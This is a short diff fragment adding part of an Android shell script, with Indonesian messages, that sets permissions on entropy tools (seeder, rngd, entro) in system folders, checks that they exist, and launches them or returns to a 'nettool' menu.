+			echo "Memberikan perijinan sistem..."
+			chmod 755 /system/bin/seeder
+			chmod 755 /system/xbin/rngd
+			chmod 755 /system/xbin/entro
+			sleep 1
+			echo "Mengecek file..."
+			sleep 1
+			for data in /system/bin/seeder /system/xbin/rngd /system/xbin/entro
+			do
+				if [ -f $data ]; then
+					echo "Data Lengkap!"
+					sleep 2
+					seeder
+				else
+					echo "Data terdapat yang kurang, ulangi kembali..."
+					sleep 2
+					nettool
+				fi
+			done
+		fi
+	done
+elif [ $option -eq 0 ]; then
+	nettool
+else
+	clear
+	echo "Perintah salah"
+	sleep 2
+	exit
+fi
